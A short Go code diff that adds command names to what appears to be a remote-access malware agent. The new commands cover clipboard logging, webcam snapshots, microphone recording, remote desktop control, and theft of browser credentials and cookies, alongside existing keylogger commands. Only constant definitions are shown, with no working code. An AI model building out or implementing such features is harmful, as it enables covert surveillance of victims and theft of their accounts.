@@ -35,6 +35,16 @@ const (
 	CmdKeylogStart = "keylog_start"
 	CmdKeylogStop  = "keylog_stop"
 	CmdKeylogDump  = "keylog_dump"
+	CmdClipboardStart = "clipboard_start"
+	CmdClipboardStop  = "clipboard_stop"
+	CmdClipboardDump  = "clipboard_dump"
+	CmdWebcamSnap     = "webcam_snap"
+	CmdMicRecord      = "mic_record"
+	CmdDesktopCapture = "desktop_capture"
+	CmdDesktopMouse   = "desktop_mouse"
+	CmdDesktopKey     = "desktop_key"
+	CmdBrowserCreds   = "browser_creds"
+	CmdBrowserCookies = "browser_cookies"
 )
 
 // AgentRequest est la structure générique des requêtes de l'agent
